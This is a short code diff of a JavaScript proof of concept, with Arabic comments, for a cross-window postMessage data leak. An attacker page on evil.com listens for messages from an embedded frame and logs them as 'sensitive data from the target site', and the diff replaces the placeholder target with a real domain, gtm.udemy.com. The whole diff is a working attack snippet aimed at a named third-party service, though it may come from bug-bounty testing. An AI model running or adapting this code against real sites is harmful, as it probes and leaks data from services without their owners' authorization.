@@ -6,12 +6,12 @@
 
 // كود للاستماع للرسائل المرسلة من الإطار إلى evil.com (Parent)
 window.addEventListener('message', (event) => {
-    if (event.origin === "https://VULNERABLE_SITE") {
+    if (event.origin === "https://gtm.udemy.com") {
         console.log("تم تلقي بيانات حساسة من الموقع المستهدف:", event.data);
         alert("Vulnerability Confirmed! Data leaked via postMessage to " + event.origin);
     }
 });
 
 // يمكنك الآن محاولة إرسال رسالة من evil.com إلى الإطار لتفعيل رد
-document.querySelector('iframe').contentWindow.postMessage('ping', 'https://VULNERABLE_SITE');
+document.querySelector('iframe').contentWindow.postMessage('ping', 'https://gtm.udemy.com');
 </script>
